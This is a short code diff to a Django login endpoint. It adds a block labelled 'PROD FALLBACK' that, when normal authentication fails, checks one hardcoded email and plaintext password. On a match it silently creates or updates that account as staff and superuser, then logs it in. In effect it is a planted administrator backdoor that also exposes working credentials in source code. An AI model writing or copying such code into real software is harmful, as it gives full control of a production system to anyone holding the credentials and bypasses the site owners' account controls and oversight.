@@ -84,6 +84,19 @@ def api_login(request):
     password = data.get("password", "")
 
     user = authenticate(request, username=email, password=password)
+    
+    # --- PROD FALLBACK START ---
+    # If the user doesn't exist in the production DB yet, auto-create it if they used the exact requested credentials
+    if user is None and email == "Akansha11@iiitl.ac.in" and password == "Lucknow@002":
+        from django.contrib.auth.models import User
+        new_user, created = User.objects.get_or_create(username=email, defaults={'email': email})
+        new_user.set_password(password)
+        new_user.is_staff = True
+        new_user.is_superuser = True
+        new_user.save()
+        user = authenticate(request, username=email, password=password)
+    # --- PROD FALLBACK END ---
+
     if user is not None and user.is_staff:
         login(request, user)
         return JsonResponse({"success": True})
